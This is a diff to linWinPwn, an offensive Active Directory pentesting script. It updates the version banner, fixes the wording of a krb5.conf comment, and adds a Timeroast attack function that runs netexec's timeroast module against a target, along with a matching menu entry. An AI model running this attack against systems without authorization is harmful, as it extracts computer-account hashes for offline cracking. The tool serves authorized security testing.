@@ -142,7 +142,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.28 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.29 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -336,7 +336,7 @@ etc_krb5conf_update() {
         krb5_bak="/etc/krb5.conf.$(date +%Y%m%d%H%M%S)".backup
         sudo cp /etc/krb5.conf "${krb5_bak}"
         echo -e "${YELLOW}[i] Backup file of /etc/krb5.conf created: ${krb5_bak}${NC}"
-        echo -e "# /etc/krb5.conf file modified added by linWinPwn" | sudo tee /etc/krb5.conf
+        echo -e "# /etc/krb5.conf file modified by linWinPwn" | sudo tee /etc/krb5.conf
         echo -e "[libdefaults]" | sudo tee -a /etc/krb5.conf
         echo -e "        default_realm = ${domain^^}" | sudo tee -a /etc/krb5.conf
         echo -e "" | sudo tee -a /etc/krb5.conf
@@ -2173,6 +2173,12 @@ ldapnomnom_enum() {
     else
         echo -e "${PURPLE}[-] ldapnomnom null session enumeration skipped (credentials provided)${NC}"
     fi
+    echo -e ""
+}
+
+ne_timeroast() {
+    echo -e "${BLUE}[*] Timeroast attack (NTP)${NC}"
+    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} -M timeroast --log ${output_dir}/BruteForce/ne_timeroast_${dc_domain}.txt"
     echo -e ""
 }
 
@@ -4298,6 +4304,7 @@ bruteforce_menu() {
     echo -e "7) User Enumeration using ldapnomnom (Null session)"
     echo -e "8) Password spraying using kerbrute (Noisy!)"
     echo -e "9) Password spraying using netexec - ldap (Noisy!)"
+    echo -e "10) Timeroast attack against NTP"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4351,6 +4358,11 @@ bruteforce_menu() {
 
     9)
         ne_passpray
+        bruteforce_menu
+        ;;
+
+    10)
+        ne_timeroast
         bruteforce_menu
         ;;
 
